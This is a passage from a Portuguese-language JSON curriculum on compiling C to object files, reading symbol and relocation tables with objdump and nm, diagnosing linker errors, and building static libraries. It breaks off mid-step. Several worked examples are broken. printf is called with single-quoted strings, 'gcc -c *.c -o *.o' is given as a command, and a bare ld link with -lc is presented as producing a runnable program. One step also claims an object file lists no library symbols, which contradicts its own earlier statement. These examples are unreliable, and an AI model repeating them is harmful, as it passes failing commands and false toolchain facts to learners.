                              ],
                              "practicalExample": "Compile 'int global_var = 42; void local_func() {} int main() { printf(\"Hello\"); return 0; }' com gcc -c prog.c -o prog.o. Use objdump -t prog.o: identifique 'printf' como GLOBAL FUNC UND (indefinida externa), 'main' como GLOBAL FUNC definida em .text, 'global_var' como GLOBAL OBJECT em .data, e funções estáticas como LOCAL.",
                              "finalVerifications": [
                                "Classifica corretamente 90% dos símbolos em um dump de objdump como local/global e definido/indefinido.",
                                "Explica o papel de cada UND global na linkagem.",
                                "Distingue tipos FUNC vs OBJECT em exemplos mistos.",
                                "Simula linkagem e prevê erros de símbolos não resolvidos.",
                                "Gera relatório tabular de símbolos com colunas Bind, Type, Status.",
                                "Identifica seções associadas via Ndx."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de Bind e Type (sem erros em 10+ símbolos).",
                                "Profundidade da classificação (contagens e exemplos por categoria).",
                                "Correlação com linkagem (previsão de resoluções/erros).",
                                "Uso correto de ferramentas (objdump/readelf sem parâmetros errados).",
                                "Relatório claro e estruturado com tabelas/visuais.",
                                "Identificação de erros comuns como símbolos ocultos."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entendimento de escopo de variáveis/funções.",
                                "Arquitetura de Computadores: formato ELF/PE e seções de memória.",
                                "Segurança da Informação: análise de binários para RE e detecção de injeções.",
                                "Sistemas Operacionais: carregadores dinâmicos e resolução em runtime.",
                                "Engenharia de Software: depuração de links e build systems (Make/CMake)."
                              ],
                              "realWorldApplication": "Em análise forense de malware ou reverse engineering, examinar tabelas de símbolos em .o ou DLLs revela dependências externas (APIs maliciosas), funções exportadas para hooks, e pontos de injeção via símbolos globais indefinidos, auxiliando em descompilação e patching de vulnerabilidades."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.3",
                            "name": "Criar arquivo objeto simples",
                            "description": "Compilar um código C ou assembly para gerar um .o e verificar suas seções e símbolos usando comandos como gcc -c e objdump -h / -t.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e escrever código fonte simples em C",
                                  "subSteps": [
                                    "Instale o GCC e binutils (ex: sudo apt install gcc binutils em Linux)",
                                    "Crie um diretório de trabalho: mkdir binario-simples && cd binario-simples",
                                    "Crie um arquivo chamado simple.c com um código básico: #include <stdio.h> int add(int a, int b) { return a + b; } int main() { printf(\"Soma: %d\\n\", add(2,3)); return 0; }",
                                    "Salve o arquivo e verifique com ls -l simple.c",
                                    "Execute gcc --version para confirmar instalação"
                                  ],
                                  "verification": "Arquivo simple.c existe e compila sem erros sintáticos (gcc -Wall simple.c -o /dev/null)",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (vim/nano/VS Code)",
                                    "Terminal Linux/macOS com GCC instalado",
                                    "Binutils (objdump)"
                                  ],
                                  "tips": [
                                    "Use código minimalista para focar no conceito; inclua funções globais para símbolos visíveis",
                                    "Evite includes desnecessários para reduzir complexidade do .o"
                                  ],
                                  "learningObjective": "Entender a estrutura básica de um programa C e preparar fonte para compilação em objeto",
                                  "commonMistakes": [
                                    "Esquecer ponto e vírgula ou chaves",
                                    "Não criar diretório de trabalho",
                                    "Usar Windows sem WSL (use Linux para compatibilidade)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o código fonte em arquivo objeto (.o)",
                                  "subSteps": [
                                    "Execute o comando: gcc -c simple.c -o simple.o",
                                    "Verifique erros de compilação no terminal",
                                    "Confirme criação do arquivo: ls -l simple.o",
                                    "Verifique tamanho e permissões: file simple.o (deve mostrar ELF 64-bit object)",
                                    "Não execute linkagem ainda: evite -o executavel"
                                  ],
                                  "verification": "Arquivo simple.o existe, tem tamanho >0 e é reconhecido como ELF object por 'file'",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Terminal",
                                    "Arquivo simple.c"
                                  ],
                                  "tips": [
                                    "Use -Wall para warnings; -c garante só compilação, sem link",
                                    "Nomeie .o explicitamente para clareza"
                                  ],
                                  "learningObjective": "Dominar compilação seletiva para gerar código objeto isolado",
                                  "commonMistakes": [
                                    "Rodar gcc simple.c sem -c (gera executável)",
                                    "Ignorar warnings de compilação",
                                    "Usar -o sem nome específico"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar seções do arquivo objeto com objdump -h",
                                  "subSteps": [
                                    "Execute: objdump -h simple.o",
                                    "Identifique seções principais: .text (código), .data (dados inicializados), .bss (dados não inicializados), .symtab",
                                    "Anote tamanhos e offsets das seções .text e .data",
                                    "Compare com documentação ELF (seções padrão para C)",
                                    "Salve saída em arquivo: objdump -h simple.o > secoes.txt"
                                  ],
                                  "verification": "Saída mostra pelo menos 10 seções incluindo .text >0 bytes e .symtab",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Objdump instalado (parte de binutils)",
                                    "Terminal",
                                    "Arquivo simple.o"
                                  ],
                                  "tips": [
                                    "-h mostra headers de seções sem disassembly; foque em tamanhos para entender overhead",
                                    "Use | less para navegar saída longa"
                                  ],
                                  "learningObjective": "Interpretar estrutura de seções ELF em arquivos objeto",
                                  "commonMistakes": [
                                    "Confundir com executável (use .o)",
                                    "Ignorar seções como .rodata",
                                    "Não notar alinhamentos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Inspecionar tabela de símbolos com objdump -t",
                                  "subSteps": [
                                    "Execute: objdump -t simple.o",
                                    "Localize símbolos globais: main, add (tipo T para text, g para global)",
                                    "Identifique símbolos locais vs globais e seus valores",
                                    "Note ausência de símbolos de biblioteca (não linkado)",
                                    "Compare com nm simple.o para validação cruzada"
                                  ],
                                  "verification": "Saída lista pelo menos main e add como símbolos globais em .symtab",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Objdump/nm instalados",
                                    "Terminal",
                                    "Arquivo simple.o"
                                  ],
                                  "tips": [
                                    "-t para tabela de símbolos dinâmica/estática; g=global, l=local, T=text, D=data",
                                    "Filtre com grep 'main\\|add'"
                                  ],
                                  "learningObjective": "Analisar tabela de símbolos para entender visibilidade e relocação",
                                  "commonMistakes": [
                                    "Confundir símbolos undefined (de libs)",
                                    "Não diferenciar binding (local/global)",
                                    "Usar objdump em executável linkado"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie simple.c com função add e main chamando-a. Compile: gcc -c simple.c -o simple.o. Rode objdump -h simple.o (veja .text ~100 bytes, .data para strings). objdump -t simple.o (veja add g T, main g T). Isso simula análise inicial de binário em pentest.",
                              "finalVerifications": [
                                "simple.o gerado sem erros de compilação",
                                "objdump -h lista seções .text, .data, .symtab com tamanhos plausíveis",
                                "objdump -t exibe símbolos main e add como globais",
                                "file simple.o confirma ELF relocatable object",
                                "Sem linkagem acidental (não há .plt ou libs linkadas)",
                                "Saídas salvas e interpretadas corretamente"
                              ],
                              "assessmentCriteria": [
                                "Execução precisa dos comandos gcc -c e objdump sem erros",
                                "Interpretação correta de saídas (identificar seções/símbolos chave)",
                                "Código fonte válido e minimalista",
                                "Documentação de descobertas (prints/screenshots)",
                                "Tempo respeitado e troubleshooting autônomo",
                                "Extensão opcional: teste com assembly inline"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly (escrita de código fonte)",
                                "Sistemas Operacionais (processo de build: compile-link-load)",
                                "Engenharia de Software (depuração e build tools)",
                                "Segurança Computacional (análise estática de binários/malware)"
                              ],
                              "realWorldApplication": "Em segurança cibernética, analistas usam isso para disassemblar malware (ex: identificar funções entry points); desenvolvedores depuram link errors; em CTFs/reverse engineering, inspecionam .o para leaks de símbolos; otimização em embedded systems."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.2",
                        "name": "Resolução de Símbolos e Relocação",
                        "description": "Processo pelo qual o linker resolve referências entre arquivos objeto, combinando símbolos indefinidos com definições e ajustando endereços absolutos via relocação.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.2.1",
                            "name": "Executar linkagem estática básica",
                            "description": "Usar ld ou gcc para linkar múltiplos arquivos .o em um executável, observando como símbolos indefinidos são resolvidos e erros de linkagem são reportados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar arquivos objeto (.o) a partir de códigos fonte simples",
                                  "subSteps": [
                                    "Criar um arquivo main.c com uma função main() que chama uma função externa.",
                                    "Criar um arquivo utils.c com a função externa declarada.",
                                    "Compilar cada arquivo fonte separadamente usando gcc -c para gerar .o.",
                                    "Verificar os arquivos .o gerados com ls e file.",
                                    "Usar nm para inspecionar símbolos em cada .o."
                                  ],
                                  "verification": "Arquivos .o existem, nm mostra símbolos definidos e indefinidos corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (vim/nano)",
                                    "gcc instalado",
                                    "Terminal Linux/Unix",
                                    "Arquivos main.c e utils.c exemplo"
                                  ],
                                  "tips": "Sempre use -c para compilar sem linkar. Salve códigos em diretório limpo.",
                                  "learningObjective": "Entender como a compilação gera objetos com símbolos locais e externos.",
                                  "commonMistakes": [
                                    "Esquecer -c e tentar compilar/linkar de uma vez.",
                                    "Não declarar funções como extern no main.c.",
                                    "Ignorar warnings de compilação."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar linkagem estática básica com sucesso usando ld ou gcc",
                                  "subSteps": [
                                    "Executar ld -o executavel main.o utils.o -lc para linkar.",
                                    "Alternativamente, usar gcc -o executavel main.o utils.o.",
                                    "Executar o binário gerado com ./executavel.",
                                    "Verificar tamanho e tipo do executável com file e ls -la.",
                                    "Usar objdump -d para disassemblar e confirmar código combinado."
                                  ],
                                  "verification": "Executável roda sem erros e produz saída esperada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "ld ou gcc",
                                    "Arquivos .o do step 1",
                                    "libc (padrão)"
                                  ],
                                  "tips": "-lc é essencial para símbolos da stdlib como printf. Use -static se quiser fully static.",
                                  "learningObjective": "Realizar linkagem estática básica e gerar executável funcional.",
                                  "commonMistakes": [
                                    "Esquecer -lc, causando undefined reference a printf.",
                                    "Ordem errada de arquivos .o (ld é sensível à ordem).",
                                    "Executar sem permissões (chmod +x)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Observar resolução de símbolos durante a linkagem bem-sucedida",
                                  "subSteps": [
                                    "Usar nm main.o e nm utils.o para listar símbolos antes.",
                                    "Executar linkagem com verbose: ld -v -o exec main.o utils.o -lc.",
                                    "Após link, nm executavel para ver símbolos resolvidos.",
                                    "Comparar símbolos indefinidos pré e pós-linkagem.",
                                    "Usar readelf -s executavel para detalhes de seções de símbolos."
                                  ],
                                  "verification": "Símbolos indefinidos de main.o resolvidos por utils.o; nenhum undefined no executável final.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "nm, readelf, objdump",
                                    "Executável do step 2"
                                  ],
                                  "tips": "nm -u filtra apenas undefined symbols. Foque em T (text) e U (undefined).",
                                  "learningObjective": "Identificar como o linker resolve referências externas via símbolos.",
                                  "commonMistakes": [
                                    "Confundir símbolos locais (t minúsculo) com globais (T maiúsculo).",
                                    "Não usar verbose para ver o processo de resolução.",
                                    "Ignorar seções como .text e .data."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Introduzir e diagnosticar erros de linkagem comuns",
                                  "subSteps": [
                                    "Remover utils.o e tentar linkar apenas main.o.",
                                    "Observar erro 'undefined reference to funcao_externa'.",
                                    "Criar utils.o com assinatura errada e recompilar; observar mismatch.",
                                    "Corrigir e relinkar com sucesso.",
                                    "Testar múltiplos erros: símbolo duplicado ou ausente."
                                  ],
                                  "verification": "Identificar causa do erro, corrigir e gerar executável funcional novamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "gcc, ld",
                                    "Códigos fonte modificáveis"
                                  ],
                                  "tips": "Erros de linkagem são fatais; leia a mensagem exata para símbolo faltante.",
                                  "learningObjective": "Diagnosticar e resolver erros de símbolos indefinidos ou conflitos.",
                                  "commonMistakes": [
                                    "Confundir erro de compilação com linkagem.",
                                    "Não recompilar .o após mudança no fonte.",
                                    "Ignorar múltiplos erros listados."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie main.c: #include <stdio.h> extern int soma(int a, int b); int main() { printf(\"%d\\n\", soma(2,3)); return 0; }. utils.c: int soma(int a, int b) { return a+b; }. Compile: gcc -c main.c utils.c. Link: ld -o prog main.o utils.o -lc. Execute: ./prog (saída: 5). Erro simulado: rm utils.o; ld main.o -lc → undefined reference to soma.",
                              "finalVerifications": [
                                "Linkar múltiplos .o em executável sem erros.",
                                "Usar nm para confirmar ausência de símbolos indefinidos no binário final.",
                                "Diagnosticar e corrigir undefined reference introduzido artificialmente.",
                                "Explicar verbalmente o processo de resolução de símbolos.",
                                "Gerar relatório com saídas de nm pré e pós-linkagem.",
                                "Executável roda e produz saída correta."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução dos comandos ld/gcc (sem erros de sintaxe).",
                                "Interpretação correta de saídas de nm/readelf (identifica símbolos resolvidos).",
                                "Capacidade de reproduzir e resolver erros de linkagem comuns.",
                                "Clareza na explicação do fluxo: compilação → linkagem → execução.",
                                "Uso adequado de ferramentas de inspeção (objdump, verbose).",
                                "Tempo de resolução de erros < 5 minutos."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de declarações extern e bibliotecas.",
                                "Análise de Binários: Inspeção de símbolos com nm/readelf/objdump.",
                                "Segurança Computacional: Identificação de dependências em binários para análise de vulnerabilidades.",
                                "Engenharia de Software: Integração em makefiles e build systems.",
                                "Sistemas Operacionais: Conceitos de carregamento e relocação."
                              ],
                              "realWorldApplication": "Em desenvolvimento de software, linkagem estática é usada em embedded systems, criação de bibliotecas .a, e debugging de grandes projetos onde erros de símbolos indefinidos ocorrem frequentemente em CI/CD pipelines ou ao integrar módulos de terceiros."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.1"
                            ]
                          },
                          {
                            "id": "10.1.1.4.2.2",
                            "name": "Entender entradas de relocação",
                            "description": "Analisar a tabela de relocação em arquivos objeto com objdump -r, compreendendo como offsets e símbolos são ajustados para formar endereços finais no executável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Relocação",
                                  "subSteps": [
                                    "Estude o que são entradas de relocação: registros que indicam onde e como ajustar endereços em seções do objeto.",
                                    "Aprenda tipos comuns de relocação (ex: R_X86_64_PC32 para PC-relative, R_X86_64_64 para absolute).",
                                    "Entenda componentes: offset (posição no arquivo), info (tipo e símbolo), addend (valor adicional).",
                                    "Diferencie relocação em arquivos objeto (.o) vs. executáveis finais.",
                                    "Revise o papel do linker em processar essas entradas para resolver símbolos."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito os componentes de uma entrada de relocação e dê um exemplo de tipo R_X86_64_PC32.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação GNU Binutils (relocatable fields), man page de ld.",
                                  "tips": "Use diagramas para visualizar offset -> símbolo -> endereço final.",
                                  "learningObjective": "Identificar e descrever os componentes essenciais de entradas de relocação.",
                                  "commonMistakes": "Confundir offset com endereço final; ignorar que relocação é relativa ao símbolo."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar um Arquivo Objeto com Referências Externas",
                                  "subSteps": [
                                    "Escreva um programa C simples chamando uma função externa (ex: printf de libc).",
                                    "Compile com gcc -c para gerar .o (ex: gcc -c main.c -o main.o).",
                                    "Verifique seções com objdump -h main.o para identificar .text e .data.",
                                    "Confirme ausência de linkagem com nm main.o (deve mostrar símbolos undefined).",
                                    "Prepare para inspeção: anote símbolos globais e externos."
                                  ],
                                  "verification": "Execute nm main.o e identifique pelo menos um símbolo undefined (U).",
                                  "estimatedTime": "20 minutos",
                                  "materials": "GCC compiler, editor de texto, terminal Linux.",
                                  "tips": "Use flags -fno-pic para relocação absoluta simples.",
                                  "learningObjective": "Criar um artefato (.o) que necessite de relocação devido a referências externas.",
                                  "commonMistakes": "Compilar diretamente para executável (-o exe) em vez de objeto (-c)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar Tabela de Relocação com objdump -r",
                                  "subSteps": [
                                    "Execute objdump -r main.o e analise a saída por seção (.rela.text, etc.).",
                                    "Identifique colunas: Offset, Type, Sym.Value, Symbol Name, Addend.",
                                    "Mapeie cada entrada: offset indica onde ajustar no .text.",
                                    "Compare com objdump -d main.o para ver instruções que geram relocação (ex: call *simbolo@GOTPCREL).",
                                    "Anote 2-3 entradas e descreva seu propósito."
                                  ],
                                  "verification": "Liste 3 entradas de relocação da saída e descreva offset e tipo para cada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Binutils (objdump), arquivo main.o gerado.",
                                  "tips": "Pipe para less: objdump -r main.o | less; filtre por grep 'RELA'.",
                                  "learningObjective": "Extrair e interpretar corretamente a tabela de relocação de um .o.",
                                  "commonMistakes": "Ignorar seções .rela.*; confundir Type com Symbol Name."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Resolução de Relocação para Endereços Finais",
                                  "subSteps": [
                                    "Linke o .o para executável: gcc main.o -o main.",
                                    "Compare objdump -r main.o vs. ausência em main (executável resolvido).",
                                    "Use readelf -r main para ver relocações pendentes no executável (ex: GOT/PLT).",
                                    "Simule manualmente: endereço final = offset + endereço_símbolo + addend.",
                                    "Verifique com gdb: desmonte e observe ajustes em runtime."
                                  ],
                                  "verification": "Calcule manualmente o endereço final de uma relocação e compare com disassembly do executável.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GCC, readelf, gdb.",
                                  "tips": "Use objdump -D main para ver código resolvido.",
                                  "learningObjective": "Compreender como o linker ajusta offsets e símbolos para endereços finais.",
                                  "commonMistakes": "Esquecer addend em cálculos; não distinguir static vs. dynamic linking."
                                }
                              ],
                              "practicalExample": "Crie main.c: int main() { printf('Hello\\n'); return 0; }. Compile: gcc -c main.c -o main.o. objdump -r main.o mostra RELA em .rela.text para printf@GLIBC_2.2.5 (offset 0x4, type R_X86_64_PC32). No executável, isso resolve para call para PLT entry de printf.",
                              "finalVerifications": [
                                "Explicar diferença entre relocação estática e dinâmica.",
                                "Identificar tipo de relocação em saída objdump -r.",
                                "Calcular endereço final de uma entrada exemplo.",
                                "Descrever papel do .rela.text.",
                                "Comparar tabela de relocação pré e pós-link.",
                                "Reconhecer quando uma instrução requer relocação."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de componentes (offset, type, symbol, addend): 25%.",
                                "Correta interpretação de pelo menos 3 tipos de relocação: 25%.",
                                "Habilidade em gerar e analisar .o com objdump -r: 20%.",
                                "Simulação precisa de resolução para executável: 15%.",
                                "Uso correto de ferramentas (nm, readelf, gdb): 10%.",
                                "Explicação clara de ajustes para endereços finais: 5%."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: Interpretação de instruções call/jmp afetadas por relocação.",
                                "Linkers e Loaders: Processo de resolução de símbolos no ld.",
                                "Segurança Binária: Exploração de PLT/GOT para ROP em binários.",
                                "Arquitetura Computacional: Endereços relativos vs. absolutos em x86_64."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, analise relocações em .o ou DLLs para mapear imports dinâmicos e hooks; em debugging de crashes, verifique relocações mal resolvidas em ASLR-enabled bins."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.1.2"
                            ]
                          },
                          {
                            "id": "10.1.1.4.2.3",
                            "name": "Diagnosticar erros de linkagem",
                            "description": "Identificar e corrigir erros comuns como símbolo indefinido ou múltiplas definições, usando verbose linking (gcc -Wl,--verbose).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e exemplos de código com erros comuns de linkagem",
                                  "subSteps": [
                                    "Instale o GCC em um ambiente Linux (ex: Ubuntu) usando 'sudo apt install build-essential'.",
                                    "Crie um diretório de trabalho: 'mkdir linkage_lab && cd linkage_lab'.",
                                    "Crie arquivo main.c com uma chamada para função indefinida: #include <stdio.h> void undefined_func(); int main() { undefined_func(); return 0; }.",
                                    "Crie arquivo lib.c vazio inicialmente.",
                                    "Compile individualmente: 'gcc -c main.c -o main.o' e 'gcc -c lib.c -o lib.o'."
                                  ],
                                  "verification": "Verifique com 'ls' se main.o e lib.o foram gerados sem erros de compilação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Terminal Linux, GCC instalado, editor de texto (vim/nano)",
                                  "tips": "Sempre compile arquivos .c para .o separadamente para isolar erros de linkagem.",
                                  "learningObjective": "Configurar um ambiente controlado para simular e analisar erros de linkagem.",
                                  "commonMistakes": "Tentar linkar sem compilar objetos individuais; esquecer de incluir stdio.h."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar linkagem verbose e interpretar saída normal",
                                  "subSteps": [
                                    "Execute linkagem com verbose: 'gcc -Wl,--verbose main.o lib.o -o prog'.",
                                    "Analise a saída: observe seções como 'attempt to open', 'successful' e símbolos resolvidos.",
                                    "Se linkar com sucesso (após correção futura), note a ausência de erros.",
                                    "Redirecione saída para arquivo: 'gcc -Wl,--verbose main.o lib.o -o prog 2>&1 | tee verbose.log'.",
                                    "Estude o log: identifique o linker usado (ld) e caminhos de busca de bibliotecas."
                                  ],
                                  "verification": "Saída verbose mostra linkagem bem-sucedida sem warnings de símbolos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Arquivos main.o e lib.o, terminal",
                                  "tips": "Use '--verbose' para ver o que o linker faz internamente, essencial para debug.",
                                  "learningObjective": "Compreender a saída verbose do linker em cenários normais.",
                                  "commonMistakes": "Ignorar warnings; confundir erros de compilação com linkagem."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Diagnosticar e corrigir erro de símbolo indefinido",
                                  "subSteps": [
                                    "Remova a definição de undefined_func de lib.c e tente linkar: erro '/usr/bin/ld: main.o: in function `main': undefined reference to `undefined_func'.",
                                    "Identifique na saída verbose: procure por 'undefined symbol' e rastreie referências.",
                                    "Corrija adicionando em lib.c: void undefined_func() { printf('Fixed!\\n'); } e recompile lib.o.",
                                    "Link novamente e verifique sucesso.",
                                    "Teste o executável: './prog' deve rodar sem erros."
                                  ],
                                  "verification": "Linkagem succeeds e programa executa corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Arquivos main.c, lib.c, GCC",
                                  "tips": "Símbolos indefinidos ocorrem por falta de implementação ou biblioteca não linkada.",
                                  "learningObjective": "Identificar causas e soluções para símbolos indefinidos usando verbose.",
                                  "commonMistakes": "Linkar sem recompilar .o alterado; esquecer de declarar protótipo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diagnosticar e corrigir múltiplas definições de símbolos",
                                  "subSteps": [
                                    "Crie outro arquivo dup.c com void undefined_func() { printf('Duplicate!\\n'); }.",
                                    "Compile dup.o: 'gcc -c dup.c -o dup.o'.",
                                    "Tente linkar: 'gcc -Wl,--verbose main.o lib.o dup.o -o prog' – erro 'multiple definition of `undefined_func''. ",
                                    "Analise verbose: note conflitos em seções .text.",
                                    "Corrija: use static em uma definição ou remova duplicata, recompile e link."
                                  ],
                                  "verification": "Linkagem sem erros de múltiplas definições e executável funcional.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Arquivos adicionais dup.c, GCC",
                                  "tips": "Múltiplas defs vêm de inline duplicados ou libs estáticas; prefira weak symbols.",
                                  "learningObjective": "Resolver conflitos de símbolos duplicados em linkagem.",
                                  "commonMistakes": "Não recompilar todos .o; confundir com erros de header guards."
                                }
                              ],
                              "practicalExample": "Crie main.c: #include <stdio.h> extern void my_func(); int main() { my_func(); return 0; }. lib1.c: void my_func() { printf('Lib1\\n'); }. lib2.c: void my_func() { printf('Lib2\\n'); }. Compile: gcc -c *.c -o *.o. Link: gcc -Wl,--verbose main.o lib1.o lib2.o -o test → erro multiple definition. Corrija movendo my_func para lib1.c e declare extern em main, ou use static em lib2.",
                              "finalVerifications": [
                                "Explica saída verbose para link normal e erros.",
                                "Identifica 'undefined reference' e causa raiz.",
                                "Resolve multiple definitions sem hacks.",
                                "Distingue erros de compilação vs. linkagem.",
                                "Usa verbose para rastrear caminhos de símbolos.",
                                "Testa executável pós-correção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação da saída verbose (90%+ acerto).",
                                "Correção efetiva de erros sem introduzir novos.",
                                "Explicação clara de causas (símbolo scope, visibilidade).",
                                "Uso adequado de flags e comandos.",
                                "Análise de log verbose com evidências.",
                                "Tempo de resolução < estimado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de declarações extern/static.",
                                "Debugging de Software: Técnicas de trace e log.",
                                "Análise de Binários: Inspeção de símbolos em ELF.",
                                "Segurança Computacional: Exploração de símbolos expostos."
                              ],
                              "realWorldApplication": "No desenvolvimento de software, diagnostica falhas em builds de projetos grandes com múltiplas bibliotecas; em segurança cibernética, analisa binários para símbolos vulneráveis ou em reverse engineering de malwares."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.3",
                        "name": "Bibliotecas e Formatos Executáveis",
                        "description": "Integração de bibliotecas estáticas (.a) e dinâmicas (.so/.dll) na linkagem, resultando em formatos como ELF (Linux) e PE (Windows), com headers e seções prontas para execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.3.1",
                            "name": "Linkar com bibliotecas estáticas",
                            "description": "Compilar e linkar um programa usando ar para criar .a e gcc para incluí-la, verificando incorporação no executável final com ldd ou objdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e compilar arquivos fonte da biblioteca em objetos",
                                  "subSteps": [
                                    "Criar um diretório de trabalho e arquivos fonte exemplo: libmath.c com funções add(int a, int b) e sub(int a, int b).",
                                    "Escrever um header libmath.h declarando as funções.",
                                    "Compilar libmath.c em objeto: gcc -c libmath.c -o libmath.o.",
                                    "Verificar o objeto gerado com file libmath.o ou nm libmath.o para símbolos.",
                                    "Garantir flags de compilação apropriadas como -Wall para warnings."
                                  ],
                                  "verification": "Execute 'nm libmath.o' e confirme presença dos símbolos add e sub.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Editor de texto (vim/nano), gcc instalado, terminal Linux/macOS",
                                  "tips": "Use -fPIC se planejar shared libs futuramente, mas não é necessário para static.",
                                  "learningObjective": "Entender como código fonte se torna objeto relocável.",
                                  "commonMistakes": "Esquecer de incluir header no fonte ou usar -c flag."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar biblioteca estática (.a) usando ar",
                                  "subSteps": [
                                    "Executar 'ar rcs libmath.a libmath.o' para arquivar o objeto.",
                                    "Verificar criação com 'ls -la libmath.a' e tamanho >0.",
                                    "Opcionalmente, ranlib libmath.a para índice de símbolos (geralmente automático).",
                                    "Listar conteúdo com 'ar t libmath.a' e 'nm libmath.a'.",
                                    "Mover para /usr/local/lib se quiser global, mas use local para este exemplo."
                                  ],
                                  "verification": "Execute 'ar t libmath.a' e veja libmath.o listado.",
                                  "estimatedTime": "5 minutos",
                                  "materials": "Ferramenta ar instalada (pacote binutils), libmath.o do step anterior",
                                  "tips": "Ordem rcs em ar: r=replace, c=create, s=symbols table.",
                                  "learningObjective": "Dominar criação de arquivos .a como agregadores de objetos.",
                                  "commonMistakes": "Usar ordem errada de flags em ar, resultando em lib vazia."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar o programa principal que usa a biblioteca",
                                  "subSteps": [
                                    "Criar main.c que inclui 'libmath.h' e chama add(2,3) e sub(5,2).",
                                    "Compilar main.c em objeto: gcc -c main.c -o main.o.",
                                    "Verificar dependências com 'gcc -M main.c' para confirmar header.",
                                    "Garantir que main.c linka corretamente funções declaradas.",
                                    "Adicionar printf para output visível no teste."
                                  ],
                                  "verification": "Execute 'nm main.o' e confirme símbolos undefined para add/sub.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "libmath.h do step 1, gcc, terminal",
                                  "tips": "Sempre declare funções no header para resolução de símbolos.",
                                  "learningObjective": "Preparar cliente da lib com símbolos unresolved.",
                                  "commonMistakes": "Não incluir header, causando erros de declaração implícita."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Linkar o executável com a biblioteca estática usando gcc",
                                  "subSteps": [
                                    "Executar 'gcc main.o -L. -lmath -o programa_estatico'.",
                                    "Explicar -L. para path local, -lmath procura libmath.a.",
                                    "Executar './programa_estatico' e verificar output correto.",
                                    "Comparar tamanho com versão sem lib para notar incorporação.",
                                    "Usar -static flag se quiser fully static (cuidado com glibc)."
                                  ],
                                  "verification": "Programa executa sem erros de 'undefined reference'.",
                                  "estimatedTime": "5 minutos",
                                  "materials": "main.o, libmath.a, gcc",
                                  "tips": "-lmath remove 'lib' e '.a' do nome na busca.",
                                  "learningObjective": "Executar link estático incorporando código da lib.",
                                  "commonMistakes": "Esquecer -L path ou nome errado em -l, causando link failure."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar incorporação da biblioteca no executável final",
                                  "subSteps": [
                                    "Executar 'ldd programa_estatico' e confirmar NO shared libs para math funcs.",
                                    "Usar 'objdump -t programa_estatico | grep add' para símbolos da lib.",
                                    "Comparar 'size programa_estatico' antes/depois para delta de tamanho.",
